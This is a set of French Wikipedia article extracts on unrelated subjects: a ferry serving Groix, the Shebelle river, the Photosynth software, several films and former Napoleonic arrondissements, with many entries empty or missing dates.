<doc id="3216994" url="https://fr.wikipedia.org/wiki?curid=3216994" title="Quand papa était femme de ménage">
Quand papa était femme de ménage

Quand papa était femme de ménage est un roman d'Anne Fine, publié en 1987 sous le titre anglais de "Madame Doubtfire".
Ce roman n'eut pas un grand succès, avant son adaptation au cinéma sous le nom de "Madame Doubtfire" en 1993 par Chris Columbus. Le roman a également été adapté en pièce de théâtre.
L'autrice.
L'autrice, Anne Fine, (née à Leicester en 1947), fut enseignante pendant quelques années. Ses romans, caractérisés par une insolence et un humour dévastateurs, ont été acclamés par la critique.
Elle a obtenu pour ce livre :

</doc>
<doc id="3216996" url="https://fr.wikipedia.org/wiki?curid=3216996" title="Saint Tudy (navire)">
Saint Tudy (navire)

Le Saint Tudy est un navire roulier construit par les Chantiers et ateliers de la Perrière en 1985 pour le compte du Conseil général du Morbihan. D'abord armé par la Compagnie morbihannaise de navigation jusqu'au , il l'est depuis par la Compagnie Océane sur la ligne Lorient - Port Tudy (Île de Groix) avec l’"Île de Groix" mais aussi le "Breizh Nevez I".
Histoire.
Origine du projet.
À la fin de l'année 1983, le remplacement du "Jean-Pierre Calloc'h", voué à remplacer le vieillissant "Belle-Isle" pour le renfort du service estival sur la ligne Quiberon - Belle-Île, est acté. Le Conseil Général souhaite la mise en service du nouveau navire d'ici à l'été 1985 et lance un appel d'offres pour la réalisation d'un prototype.
Ses caractéristiques générales sont sensiblement différentes des navires construits jusqu'alors, puisqu'il sera de type roulier, capable d'embarquer plusieurs poids-lourds sur un imposant entrepont ayant de clair sous barrots. La longueur est portée à près de , la largeur à , mais afin de garantir un accès aisé du navire à Lorient et à Groix, le tirant d'eau est limité à . Ces imposantes dimensions conduisent, pour faciliter la manœuvrabilité et diminuer le risque d'avarie lorsque le navire évolue près des cales, au choix d'un nouveau type de propulsion azimutal. Les passagers ne sont pas oubliés, car même si la capacité demandée est plus faible que sur le "Kreiz er Mor", il est demandé aux postulants de mettre l'accent sur le confort des aménagements.
Construction et mise en service.
La commande est attribuée aux Chantiers et ateliers de la Perrière au début de l'année 1984, et la construction, qui doit durer à peine plus d'un an, est lancée.
Les caractéristiques définitives sont les suivantes :
La silhouette générale frappe tout d'abord par son asymétrie, en effet, conçu pour permettre aux véhicules d'embarquer et de débarquer en marche avant avec un minimum de manœuvres, le futur "Saint Tudy" est équipé de deux grandes portes d'embarquement sur bâbord, à l'avant et à l'arrière. Entre ces deux ouvertures, deux salons sont aménagés, tandis que les locaux techniques et le tambour machine sont situés de l'autre côté du garage sur tribord. Sur le pont supérieur, on trouve la timonerie, surélevée afin d'améliorer la visibilité. En arrière de celle-ci, se trouve un salon fermé, et un espace passagers en extérieur, partiellement couvert, où se situe également la drome de sauvetage.
Sur le plan technique, le "Saint Tudy" est équipé, à l'instar de ses aînés, de deux moteurs Duvant-Crépelle à 4 cylindres en ligne, développant chacun 625 chevaux. Ceux-ci entraînent par le biais d'un réducteur, les deux propulseurs azimutaux Aquamaster. La propulsion est complétée par un propulseur d'étrave électrique en tunnel, d'une puissance de 100 chevaux. Pour le confort des passagers, deux stabilisateurs rétractables d'un nouveau type sont installés en avant de la salle des machines. À l'inverse de ceux montés sur les autres navires, déployés par un vérin sur l'axe des ailerons, ceux du "Saint Tudy" pivotent autour d'un axe vertical.
La construction débute en . Les essais, initialement prévus au début du mois de pour une mise en service le courant, sont repoussés début juin. Ceux-ci mettent en évidence une vitesse un peu plus faible qu'espérée, ainsi qu'une mauvaise stabilité directionnelle. Après le changement des hélices et l'ajout de plans de dérive fixes sur la coque destinés à améliorer la tenue de route, le navire est admis au service le .
En dépit des nombreux soucis liés à la mise au point de l'appareil propulsif et aux stabilisateurs, qui perturbent les premiers mois d'exploitation, le "Saint Tudy" apporte une entière satisfaction avec sa grande capacité et sa bonne manœuvrabilité. Il prouvera également sa bonne tenue à la mer lors des tempêtes de l'hiver 1986.
Service actif.
Le "Saint Tudy" assure la desserte de l'Île de Groix avec le "Kreiz er Mor" dès 1985. Le premier est basé à Lorient, tandis que le second l'est à Groix.
Le , le "Saint Tudy" et le "Kreiz er Mor", pris dans un épais banc de brume, entrent en collision dans la passe de la Citadelle de Port-Louis, à l'entrée de la Rade de Lorient.
En 1992, la CMN opère un changement de livrée, le "Saint Tudy" désormais tout de blanc arbore alors un liseré rouge, surmonté d'un bleu plus fin.
En 1998, l'inauguration de la nouvelle gare maritime au bout du quai de l'Estacade entraîne le déplacement du tablier d'embarquement arrière, il sera situé sur le tableau arrière et non plus sur le bordé. En effet, contrairement à l'ancienne gare maritime située sur le Quai de Rohan, doté d'une cale inclinée, le nouvel équipement est doté d'un ponton flottant. Le "Saint Tudy" accoste au bout de celui-ci et prend appui sur deux duc-d'Albe sur tribord. La modification de structure sera effectuée lors du carénage annuel, et sera également l'occasion d'une évolution dans la livrée, les liserés échangeant leurs couleurs.
À partir de 2002, l'exploitation du service hivernal est assurée uniquement par le "Saint Tudy", et son poste de nuit sera désormais celui de Port-Tudy. À cet effet, une porte est aménagée dans le bordé bâbord afin de permettre à l'équipage de quitter le navire une fois celui-ci amarré en haut de la cale Guyot.
L'évolution des normes de sécurité va imposer entre 2002 et 2004 plusieurs modifications importantes. Le salon situé au niveau du pont principal est isolé du garage par deux lourdes portes étanches, les salons sont adaptés pour la réception de personnes en fauteuil roulant, le système de détection et de lutte contre l'incendie est sensiblement amélioré, et enfin la drome de sauvetage est modifiée.
Le , il passe sous pavillon de la Compagnie Océane, et arbore une nouvelle livrée dès sa sortie de carénage la même année.
Le , il entre en collision avec l"Île de Groix", en service depuis le de la même année, au niveau de la Citadelle, dans des conditions similaires à l'incident de 1985. Plusieurs causes à cet abordage seront pointées par l'enquête. Le brouillard très épais, associé à un croisement des navires dans une passe très étroite sont les principales causes de cet accident, l'enquête pointant également des facteurs aggravants tels qu'un mauvais aménagements des deux timoneries, et des manquements à certaines règles du RIPAM. L"Île de Groix", endommagé, doit être conduit à Concarneau principalement pour réparations sur ses œuvres vives. Le "Saint Tudy" est moins touché, mais une partie de ses équipements de sauvetage ont été perdus, arrachés par l'aileron de passerelle de l"Île de Groix" lors de la collision, ce qui obligera la Compagnie Océane à limiter son exploitation au passage de véhicules et de fret quelques semaines.
Entre 2009 et 2011, plusieurs évolutions sont à noter dans la livrée. La tôle de gouttière au-dessus de la passerelle passe du noir à l'orange, en hommage au "Kreiz er Mor", et la partie des œuvres mortes située entre la ligne de flottaison et le livet de pont se pare de bleu, ce qui accentue la ressemblance avec les navires de la Brittany Ferries.
A la même époque, le coût d'exploitation de l’"Île de Groix" étant élevé, il est décidé que seul le "Saint Tudy" assurerait le service l'hiver. Le service intensif auquel il est soumis, ainsi que sa propulsion vieillissante conduisent à décider une remotorisation, afin de lui permettre d'effectuer son service dans les meilleures conditions. Les travaux sont menés par la division des réparations navales de l'entreprise Piriou, dans sa grande forme de Concarneau. Les moteurs Duvant-Crépelle sont déposés et remplacés par des moteurs ABC de 6 cylindres. Le propulseur d'étrave voit sa puissance portée à 330 chevaux.
Remplacement et devenir.
Aujourd'hui âgé de , le "Saint Tudy", bien que répondant encore efficacement aux besoins de l'île, vieillit. Son remplacement est acté en 2013, et la commande est passée au chantier Piriou le . La mise en service du "Breizh Nevez I" le , dont l'architecture générale reprend de celle du "Saint Tudy", entraîne la mise en réserve de ce dernier, et provoque la sortie de flotte de l"Acadie", dont le permis de navigation ne peut plus être renouvelé dans la catégorie des navires à passagers depuis le . En ce qui concerne le "Saint Tudy", il a été immobilisé pendant 3 ans à cause d'une panne au niveau de sa transmission. Cela a engendré une inquiétude chez les habitants de l'ile car en cas d'avarie sur le "Breizh Nevez I" ou sur sur "l'Ile de Groix", il n'y a plus de navire de réserve. Cependant depuis début 2024, le navire a été réparé et il a recommencé ses liaisons au début du mois de juin 2024.

</doc>
<doc id="3217000" url="https://fr.wikipedia.org/wiki?curid=3217000" title="Brasserie Laden-Wallez">
Brasserie Laden-Wallez

La Brasserie Laden-Wallez est un ancien établissement industriel, situé à Somain dans le département français du Nord.
Le logement patronal est ensuite racheté pour y faire un restaurant gastronomique nommé « les Années Folles », puis divisé en appartements.
Historique.
L'atelier de fabrication est inscrit aux monuments historiques. Ce n'est pas le cas du logement patronal.

</doc>
<doc id="3217001" url="https://fr.wikipedia.org/wiki?curid=3217001" title="Arrondissement d'Almelo">
Arrondissement d'Almelo

L'arrondissement d'Almélo (ancienne francisation d"'Almelo") était une subdivision administrative française du département des Bouches-de-l'Yssel créée le et supprimée le à la chute de l'Empire.
Sa préfecture était la ville d'Almélo.
Géographie.
Composition.
Il comprenait les cantons de :

</doc>
<doc id="3217002" url="https://fr.wikipedia.org/wiki?curid=3217002" title="Cédric Brelet von Sydow">
Cédric Brelet von Sydow

Cédric Brelet von Sydow, né le , est un acteur et réalisateur français.
Biographie.
Il intègre l'école des Beaux-Arts de Toulon (EBAT) en 1992, puis la Villa Arson à Nice de 1994 à 1997, il y obtient le DNAP avec les félicitations du jury et le DNSEP. Parallèlement, il travaille comme assistant pour l'artiste Ben pendant plusieurs années, et fait de nombreuses apparitions comme figurant à l'Opéra de Nice.
Fils de l'acteur Max von Sydow par adoption, il se tourne vers le cinéma en tant qu'acteur. Il apparaît dans "Entrusted" (2003) (téléfilm), "Le Scaphandre et le Papillon" (2007), "Slovenka" ("La Fille de Slovénie") (2009).
Parallèlement, il passe à la réalisation de documentaires sur les coulisses de tournage. En 1997 il réalise son premier making-of : "La Principessa e il povero". Il travaille par la suite sur des films de Steven Spielberg ("Minority Report"), Dario Argento ("Le Sang des innocents"), Brett Ratner ("Rush Hour 3"), Martin Scorsese ("Shutter Island").
En 2001, il crée "Débric et Débroc" avec Jean Dalmasso, série de petits courts-métrages.

</doc>
<doc id="3217005" url="https://fr.wikipedia.org/wiki?curid=3217005" title="Kab-Yong Jin">
Kab-Yong Jin



</doc>
<doc id="3217008" url="https://fr.wikipedia.org/wiki?curid=3217008" title="Cédric brelet von sydow">
Cédric brelet von sydow



</doc>
<doc id="3217016" url="https://fr.wikipedia.org/wiki?curid=3217016" title="Chébéli">
Chébéli

Le Chébéli, Shabeelle ou Shebelé () est un cours d'eau de la Corne de l'Afrique qui traverse les territoires de l'Éthiopie et de la Somalie.
Géographie.
D'une longueur totale de , il prend sa source sur les Plateaux d'Éthiopie qu'il traverse sur en direction du sud-est à travers la région Somali éthiopienne. Il pénètre ensuite en Somalie. Juste avant Mogadiscio, il se coude en direction du sud-ouest et suit alors la côte.
Après Mogadiscio, le Chébéli devient saisonnier ; la plupart du temps, le cours d'eau s'assèche avant d'atteindre l'embouchure de la Jubba, mais il lui arrive de l'atteindre réellement lors de saisons fortement pluvieuses.
Histoire.
Enrico Baudi di Vesme, en 1891, en partant de Berbera en Somalie britannique sur la côte d'Aden, explore le Chébéli avec 
Débit.
D'après AQUASTAT, le débit moyen du Chébéli est de 73 m³/s au niveau de la frontière entre l'Éthiopie et la Somalie (c'est-à-dire 2,3 kilomètres cubes par an).
Étymologie.
Le nom de la rivière dérive du somali "Wabi Shabeelle" signifiant « la rivière aux léopards ».
Affluents.
Le Chébéli possède plusieurs affluents, saisonniers ou permanents. Ils comprennent :
Le Fafen n'atteint le Chébéli que lors d'inondations. En temps normal, il s'assèche auparavant.

</doc>
<doc id="3217017" url="https://fr.wikipedia.org/wiki?curid=3217017" title="Aérodrome d'Aubenas Ardèche méridionale">
Aérodrome d'Aubenas Ardèche méridionale

L'aérodrome d'Aubenas Ardèche méridionale (anciennement Aubenas - Vals Lanas) se situe en Rhône-Alpes sur la commune de Lanas à proximité d'Aubenas dans le sud de l'Ardèche.
Situation.
L'aérodrome est situé à au sud-sud-ouest d'Aubenas, à laquelle il est relié par la route départementale .
Agrément.
L'aérodrome d'Aubenas Ardèche méridionale fait partie de la liste n° 1 (aérodromes ouverts à la circulation aérienne publique) des aérodromes autorisés au (décret : NOR : DEVA1012766K ).
Description.
C'est un aérodrome civil ouvert au trafic international. Il est situé à une quinzaine de kilomètres des gorges de l'Ardèche.
Le Syndicat départemental d'équipement de l'Ardèche est propriétaire de l'aérodrome et le conseil général de l'Ardèche finance les investissements importants. Le gestionnaire est la Chambre de commerce et d'industrie Ardèche Méridionale. Elle assure l’entretien, le bon fonctionnement des installations et la prestation AFIS pour laquelle elle est certifiée. Elle en assurait la gestion jusqu'au .
Activité.
Il est destiné au désenclavement du département, à la lutte contre les feux de forêts, aux activités aéronautiques de loisirs et pour le transport de passagers.
La longueur de la piste et sa résistance permettent l'atterrissage d'avions de transport de passagers d'environ 50 places. Des avions de transport militaires de 60 tonnes se posent régulièrement pour l'entraînement des pilotes. Au total, l'aéroport a environ 12 000 mouvements par an.
L'aérodrome possède également une piste réservée aux U.L.M. L'activité y est soutenue soit environ 3 000 mouvements par an.
Historique.
Il fut utilisé pendant la Seconde Guerre mondiale comme terrain de largage aérien (Terrain Acier).

</doc>
<doc id="3217019" url="https://fr.wikipedia.org/wiki?curid=3217019" title="Arrondissement de Deventer">
Arrondissement de Deventer

Larrondissement de Deventer est une ancienne subdivision administrative française du département des Bouches-de-l'Yssel créée en 1811 et supprimée en 1814.
Historique.
Les départements français de la Hollande sont créés le , à la suite de l'annexion du royaume de Hollande le . L'organisation administrative en est fixée par décret du et l'arrondissement de Deventer est officiellement créé à cette occasion.
Diederich van Omphal van Ysendoorn et Pierre van Gobbelschroy en sont successivement sous-préfets,
L'ensemble des unités administratives françaises de la Hollande est officiellement supprimé par le traité de Paris en mai 1814.
L'arrondissement correspond au tiers central de la province néerlandaise actuelle de l'Overijssel.
Composition.
L'arrondissement comprenait les cantons de Deventer, Hardenberg, Ommen et Raalte.

</doc>
<doc id="3217021" url="https://fr.wikipedia.org/wiki?curid=3217021" title="Shebelle">
Shebelle



</doc>
<doc id="3217024" url="https://fr.wikipedia.org/wiki?curid=3217024" title="Saint Tudy">
Saint Tudy

Saint Tudy est un nom propre qui peut désigner :

</doc>
<doc id="3217031" url="https://fr.wikipedia.org/wiki?curid=3217031" title="Fusobacteriaceae">
Fusobacteriaceae

Les Fusobacteriaceae sont une famille de bacilles Gram négatifs de l'ordre des "Fusobacteriales". Son nom provient de "Fusobacterium" qui est le genre type de cette famille.
Taxonomie.
Étymologie.
L'étymologie de "Fusobacteriaceae" est la suivante : N.L. neut. n. "Fusobacterium", genre type de la famille; L. fem. pl. n. suff. "-aceae", suffixe pour définir une famille; N.L. fem. pl. n. "Fusobacteriaceae", la famille des "Fusobacterium".
Nomenclature.
Cette famille est proposée en 2012 par J.T. Staley et W.B. Whitman dans la deuxième édition du "Bergey's Manual of Systematic Bacteriology". Elle est validée la même année par une publication dans l'IJSEM.
Liste de genres.
Selon la , les genres composant la famille "Fusobacteriaceae" sont les suivants :
Anciens genres.
Les genres "Leptotrichia", "Sebaldella", "Sneathia" et "Streptobacillus" qui faisaient partie de cette famille "Fusobacteriaceae", ont été transférés dans la famille "Leptotrichiaceae".

</doc>
<doc id="3217033" url="https://fr.wikipedia.org/wiki?curid=3217033" title="Fusobacteriales">
Fusobacteriales

Les Fusobacteriales sont un ordre de bacilles Gram négatifs de la classe des "Fusobacteriia". Son nom provient de "Fusobacterium" qui est le genre type de cet ordre.
Taxonomie.
Cet ordre est proposé en 2012 par J.T. Staley et W.B. Whitman dans la deuxième édition du "Bergey's Manual of Systematic Bacteriology". Il est validé la même année par une publication dans l'IJSEM.
Liste de familles.
Selon la :
Phylogénie.
Sur la base de 120 protéines de marquage, le GTDB 09-RS220 identifie :

</doc>
<doc id="3217034" url="https://fr.wikipedia.org/wiki?curid=3217034" title="Carlos Martínez Álvarez">
Carlos Martínez Álvarez

Carlos Martínez Álvarez, né le à Pravia (Asturies), est un acteur qui se consacre au mime depuis 1982. Il a créé un monde de gestes qui entremêle un rythme précis et une technique soignée. Carlos Martinez a donné des cours de pantomime, de théâtre et d'expression corporelle dans les écoles, les collèges et les universités. Son art sans paroles lui a permis de participer à de nombreuses manifestations internationales (théâtres, conventions, expositions, festivals des arts de la scène, télévision et conférences).
Récompenses.
En reconnaissance de son travail comme mime, Carlos Martínez a été récompensé en 2002 par la fondation allemande « Bible et Culture » comme artiste de l'année.
En 2005, Carlos Martinez s'est vu attribuer le prix de l’honneur du XXI Festival d'Almada (Portugal), pour son spectacle "Fait Main".
En 2009, son spectacle "Books without Words" (Livres sans paroles) a gagné le prix public au festival TeatroAgosto à Fundão, Portugal.
En reconnaissance de son travail comme mime, Carlos Martínez a été récompensé en 2018 par l'organisation « World Mime Organisation » .

</doc>
<doc id="3217036" url="https://fr.wikipedia.org/wiki?curid=3217036" title="Min-ho Kang">
Min-ho Kang



</doc>
<doc id="3217039" url="https://fr.wikipedia.org/wiki?curid=3217039" title="Hyuk Kwon">
Hyuk Kwon



</doc>
<doc id="3217053" url="https://fr.wikipedia.org/wiki?curid=3217053" title="Arrondissement de Bois-le-Duc">
Arrondissement de Bois-le-Duc

L'arrondissement de Bois-le-Duc est une ancienne subdivision administrative française du département des Bouches-du-Rhin créée le et supprimée le .
Composition.
Il comprenait les cantons de Bois-le-Duc, Boxtel, Heusden, Oisterwijk, Oss, Tilburg, Waalwijk et Zaltbommel.

</doc>
<doc id="3217074" url="https://fr.wikipedia.org/wiki?curid=3217074" title="HRSC">
HRSC



</doc>
<doc id="3217079" url="https://fr.wikipedia.org/wiki?curid=3217079" title="Université internationale de Monaco">
Université internationale de Monaco

L'université internationale de Monaco (), abrégé de l'anglais IUM, est un établissement d'enseignement supérieur privé monégasque proposant des programmes d'enseignement de troisième cycle (Bachelor, MBA et DBA) en anglais. Elle est membre du groupe Omnes Éducation (INSEEC) et est située à la Condamine.
Les enseignements de l'université touchent au secteur du luxe. À ce titre, les étudiants sont impliqués dans le Monaco Yacht Show, le Grand Prix de Monaco, le ePrix.
L'université est partenaire de la Fondation Prince-Albert-II-de-Monaco.
Histoire.
Le gouvernement de Monaco, en application de la loi du 14 août 1967 sur l’enseignement, reconnaît l’université internationale de Monaco et certifie ses diplômes.
Son école de commerce (spécialisée finances et luxe) est créée en 1986 par un fonds d’investissement suisse. En 2010, le groupe américain Career Education Corporation (propriétaire de l'INSEEC) la rachète. Elle compte alors 400 étudiants. Il s'ensuit le début de son rapprochement avec l'INSEEC.
Historiquement située dans les locaux du stade Louis-II, l'université déménage dans la nouvelle tour Le Stella en 2019.
Depuis 2021, les programmes de l'université sont accrédités par l' (AACSB). En 2024, l'université atteint un effectif de 1 100 étudiants (+50% en deux ans) et considère un nouveau déménagement pour accompagner sa croissance.
Le diplôme MBA de l'IUM est accrédité par l"'Association of MBAs".

</doc>
<doc id="3217082" url="https://fr.wikipedia.org/wiki?curid=3217082" title="Forum pour la coopération des syndicats (Hongrie)">
Forum pour la coopération des syndicats (Hongrie)



</doc>
<doc id="3217086" url="https://fr.wikipedia.org/wiki?curid=3217086" title="Fédération nationale des conseils de travailleurs (Hongrie)">
Fédération nationale des conseils de travailleurs (Hongrie)



</doc>
<doc id="3217089" url="https://fr.wikipedia.org/wiki?curid=3217089" title="B-1 Lancer">
B-1 Lancer



</doc>
<doc id="3217091" url="https://fr.wikipedia.org/wiki?curid=3217091" title="Confédération démocratique des syndicats libres (Hongrie)">
Confédération démocratique des syndicats libres (Hongrie)



</doc>
<doc id="3217095" url="https://fr.wikipedia.org/wiki?curid=3217095" title="Meurtre dans un collège anglais">
Meurtre dans un collège anglais



</doc>
<doc id="3217097" url="https://fr.wikipedia.org/wiki?curid=3217097" title="Confédération des syndicats des fonctionnaires publics (Grèce)">
Confédération des syndicats des fonctionnaires publics (Grèce)



</doc>
<doc id="3217099" url="https://fr.wikipedia.org/wiki?curid=3217099" title="Groupe d'armée Vistule">
Groupe d'armée Vistule



</doc>
<doc id="3217101" url="https://fr.wikipedia.org/wiki?curid=3217101" title="Confédération des employés municipaux et de l'État (Islande)">
Confédération des employés municipaux et de l'État (Islande)



</doc>
<doc id="3217106" url="https://fr.wikipedia.org/wiki?curid=3217106" title="Panique dans la rue">
Panique dans la rue

Panique dans la rue (titre original : "") est un film américain réalisé par Elia Kazan, sorti en 1950.
Synopsis.
Kochak, un émigré venant d'arriver clandestinement par bateau à la Nouvelle-Orléans, est assassiné par ses partenaires de poker alors qu'il venait d'empocher la mise et souhaitait se retirer, ne se sentant pas bien. Le lendemain, la police découvre son corps. L'affaire, d'apparence banale, prend des proportions inattendues lorsque l'autopsie révèle qu'il était atteint de la peste pulmonaire (pneumonique). Le , représentant du service sanitaire, et le capitaine Warren vont effectuer une course contre la montre pour retrouver les personnes ayant pu être en contact avec Kochak, en particulier ses assassins, avant que l'épidémie devienne incontrôlable.
Distribution.
Jack N. Young

</doc>
<doc id="3217108" url="https://fr.wikipedia.org/wiki?curid=3217108" title="Photosynth">
Photosynth

Photosynth est un logiciel en ligne publié par Microsoft, de représentation et d'exploration visuelle automatique ou interactive dites immersives de parties du Monde, sous forme de scènes ou d'objets 3D composés à partir de photographies, soit en mode diaporama soit depuis 2012 en mode parcours virtuels interactif proche de la vidéo (Tech Preview), l'ensemble pouvant être manipulé comme un objet 3D. Globe virtuel Virtual Earth en est un support. Il se présente sous la forme d'une visionneuse interactive pour navigateurs Web. Premier (en 2008) d'un nouveau type d'application grand public, Photosynth offre une approche assez différente de celle des outils liés à Google Earth que sont Sketchup, et Street View et son positionnement de photos.
En pratique.
Accès.
Photosynth est toujours accessible gratuitement en mode consultable (page Web via quelques navigateurs et systèmes supportant le player Silverlight Silverlight dont Internet Explorer mais pas Edge), soit en mode création avec un compte Microsoft et l'installation de sa forme logiciel PC dédiée, soit comme application mobile, alors Photosynth est disponible sur Windows Mobile et iOS, cette application fonctionne sur des "smartphones" équipés d'au moins de mémoire vive et d'un gyroscope. Ceux-ci se connectant au serveurs Microsoft pour l'upload des photographies (traitement en ligne) relié au site Web Photosynth.
Généralité.
Ce logiciel permet la visualisation de lieux de tailles relativement réduite (place, bâtiment, objets). Ces prises de vues sont appelées "objets", et le tout est nommé : "scène". Le logiciel nomme ces scènes: "synth" (image synthétique en volume). 
Il est conseillé par Microsoft de modéliser des scènes en envoyant entre 3 et 300 photographies, ceci en 2008. En 2016 les capacités de traitement des serveurs permettent désormais de produire aisément des rendus "objet" intérieur et extérieur mêlés, dont des images de synthèse (points de vue) à partir de plus de 1000 photogrammes.
Ces photographies sont censées être positionnées précisément les unes par rapport aux autres. Pour l'utilisateur, l'exploration et les manipulations de navigation interactive, se font librement, à l'aide de la souris ou du clavier.
Il existe également un mode automatique interactivable à tout moment, qui utilise des effets des transitions et fusions en 3D ou pseudo-3D
Méthode.
Même si devant toujours être d'une même zone spatiale, comme chaque scènes peut être composée de photographies récentes ou anciennes numérisées, les évolutions temporelles peuvent y être représentées, mais à noter qu'actuellement aucun outil n'organise cet aspect temporel.
Utilisant le mode commun d'installation des logiciels pour Windows il est composé de plusieurs outils, dont deux intégrés, sont installés dans l'ordinateur de l'usager :
1) une l'interface spécifique non-navigateur, appelable soit par celui-ci, soit via l'icône Photosynth, de chargement (exportation, ou "upload") vers votre espace personnel dans les unités de stockage de Microsoft. Les photographies sont chargées en un groupe par scène, plusieurs groupes correspondant à plusieurs scènes aux intitulés différents. 
Puis finalement :2) un système de traitement automatique et très rapide, après upload, des photographies.Le résultat, visible sur la page Web, met quelques minutes à plusieurs heures pour apparaître, selon la vitesse d'upload et le nombre de photographies à traiter.
Technique.
Support.
La version publique était disponible pour les systèmes d'exploitations suivants : Windows 10, 8, 7, Vista, XP, Microsoft mobile OS et Mac OS X.
Technologies.
La technologie principale utilisée est une méthode de structuration de l'espace en un nuage de points en 3D (visualisable lui-même en 3D exploratrice dans Photosynth). 
Elle produit des groupes de "points" géométriques, principalement à partir d'une analyse des "objets" présents dans chaque photographie et de leurs formes distinguables et marquables par une méthode de triangulation 2D automatique (ce type de fonction est, dans le domaine de la 2D, par exemple, désormais intégré dans les logiciels de fusion de photographies pour panoramas ).
Ensuite la comparaison entre les images pour y trouver les groupes de points qui leur sont communs en les situant dans un espace à 3 dimensions, permet de reconstituer la topologie 3D de cet espace fragmentaire à l'origine. 
Finalement, on obtient une scène, nommée un « Synth », composé d'abord de cette structure 3D (le nuage) support de la scène globale, puis la technologie de navigation (SeaDragon à l'origine et désormais Silverlight), permet d'explorer à la souris à partir, pour chaque vue, d'un lien délimité par un cadre. Ce cadre est positionné de telle manière qu'il correspond à la position et orientation, dans la scène globale, de l'appareil photo lors de la prise de vue, le cadre étant orienté vers la vue elle-même. Quand on clique sur un cadre l'image qu'il représente et quelques-unes alentour, s'affichent de manière progressive, fluide et rapide en commençant par des versions basse-résolution des photos. Cet affichage se fait en flux Internet direct, le streaming, les photos et le nuages de point ne sont, à aucun moment, stockés dans le disque dur de l'ordinateur de l'utilisateur, une seule solution facile mais limitée étant la capture d'écran.
Remarques sur les capacités de reconstitution.
La pré-version de démonstration, non disponible au public pour la production, a déjà été capable de démontrer une puissance de traitement un peu supérieure par la réalisation de scènes comprenant jusqu'à près de 500 images, par exemple pour une vue de la Yosemite Valley (497 images). À noter qu'il s'agit là pour cet exemple et le suivant d'un partenariat avec la revue National Geographic, qui fournit parmi les plus belles scènes immersives assemblées avec Photosynth.
Encore plus spectaculaire est une scène de la Place Saint Marc à Venise, composée de 467 photos, où des capacités, encore en développement de Photosynth, sont bien imaginables et commencent à être visibles : ici spécifiquement ses capacités de synthèse en volume 3D avec un rendu des matières et en couleur. Ce synth, par exemple, en se plaçant juste devant la porte centrale de la Basilique Saint Marc, peut être tourné, grâce à un halo, sur 360° à l'horizontale et sur 180° à la verticale.
Mais bien plus surprenant est le rendu en couleur des objets, par les points colorés eux-mêmes. 
Ce sont les circonstances d'éclairage lors des prises de vue qui ont permis cela. 
Cette qualité est particulièrement visible pour la peinture nommée "Il Giudizio Universale" au-dessus de la porte principale. 
Savoir profiter au mieux des éclairages semble donc essentiel pour la qualité du rendu 3D. 
On peut imaginer sans mal que le rendu 3D ne sera plus uniquement un nuage de points, mais sera assez réaliste lorsque le système assemblera bien plus de photos, et surtout lorsqu'il disposera les textures extraites des photos, ce que l'outil similaire de Autodesk est capable de produire depuis 2012.
Historique.
Ce système logiciel a préalablement commencé à être développé à l'Université de Washington sous le nom de laboratoire de "Photo Tourisme" par Noah Snavely (UW), Steve Seitz (UW). Puis avec Richard Szeliski de Microsoft Research. Ainsi que, pour la partie navigation, par la société SeaDragon, rachetée en 2006 par Microsoft.
Une version de démonstration n'incluant que l'outil de visualisation a été disponible en téléchargement du au , pour Internet Explorer, et pour, Firefox sous forme d'un plugin xpi.
Pour le grand public, la première version opérationnelle est sortie le . Elle porte le numéro interne de version 2.0.1403.5.
Exemple.
1100 photos, intérieur et extérieur mêlés : La chapelle de la Trinité, île de Groix

</doc>
<doc id="3217110" url="https://fr.wikipedia.org/wiki?curid=3217110" title="Confédération révolutionnaire des ouvriers et paysans (Mexique)">
Confédération révolutionnaire des ouvriers et paysans (Mexique)



</doc>
<doc id="3217113" url="https://fr.wikipedia.org/wiki?curid=3217113" title="Vent de panique">
Vent de panique

Vent de panique est un film français de Bernard Stora sorti en 1987.
Le film suit un couple d’escrocs, Roland et Martine Pochon, qui engagent Isabelle, dix-huit ans, pour garder les enfants qu’ils n’ont pas dans une superbe propriété qu’ils n’ont jamais possédée. En réalité, ils espèrent la vendre à un truand propriétaire de boîte de nuit. Mais au dernier moment, touchés par la naïveté de la jeune fille, ils renoncent à leur projet et la libèrent. Oui mais voilà, Isabelle, qui ne s’est jamais autant amusée de sa vie, refuse de rentrer chez elle.
Synopsis.
« Jeune fille bien sous tous rapports cherche emploi maison ou garde enfants. Urgent. »
La jeune fille, c'est Isabelle (Olivia Brunaux), dix-huit ans, jolie, un peu naïve. Elle a passé l'annonce sans rien dire à ses parents. Deux jours après, un couple se présente, Roland Pochon (Bernard Giraudeau) et Martine, sa femme (Caroline Cellier). Trente-cinq ans, bien mis, des gens sérieux qui habitent Antibes et voyagent beaucoup pour leurs affaires. Isabelle n'hésite pas une seconde : pas question de laisser échapper une occasion pareille.
À peine en route, changement de programme. Antibes, les enfants, les affaires aux quatre coins du monde, tout ça c'est du vent. En réalité, Roland est un escroc à la petite semaine. Martine et lui se sont rencontrés encore enfants. Ensemble, ils formaient le couple vedette d'un feuilleton TV à succès, "Zoup et Zoupette". Hélas, parvenus à l'adolescence, ils ont dû abandonner leur rôle et sont retombés dans l'anonymat. Depuis, ils vont à l'aventure, toujours à l'affût d'un nouveau coup. Ils ont enlevé Isabelle dans l'intention d'en tirer profit. Ils pensent avoir trouvé un acquéreur en la personne d'Amarachi (Lucky Blondo), un truand propriétaire de boîte de nuit. Mais au dernier moment, ils se déballonnent et veulent renvoyer la jeune fille dans ses foyers. Elle refuse net : pour une fois qu'elle se marre...
Commence alors une folle cavale à travers la France. Chéquiers volés, identités multiples, déménagements à la cloche de bois, arnaque en tous genres, le trio se révèle d'une redoutable efficacité. Les jours passent, les coups tordus vont bon train, malgré la filature d'Humphires (Jean-Pierre Kalfon), le détective privé chargé par la Fédération des Victimes de Roland Pochon de guetter le moment favorable pour les coincer.
Un jour, Isabelle en a marre. Le premier auto-stoppeur venu fait l'affaire. Elle s'en va. Roland, secrètement amoureux de la jeune fille, se désespère. Les semaines passent, Roland broie du noir. Humphries les remet sur les traces d'Isabelle qu'ils enlèvent pour la seconde fois, le jour même de son mariage. Elle est enceinte, mais qu'importe ; ils élèveront ensemble le bébé.
Autour du film.
La sortie en salles de "Vent de panique" a été "sabotée" par une campagne publicitaire peu adaptée au contenu du film : le distributeur avait en effet barré l'affiche du slogan "SALOPES !!". Cette accroche provocatrice visait à renouveler l'effet obtenu par le "Putain de film !" de "Tenue de soirée", qui avait fait grand bruit l'année précédente. Elle eut cependant l'effet inverse à celui escompté et contribua à l'échec commercial du film.

</doc>
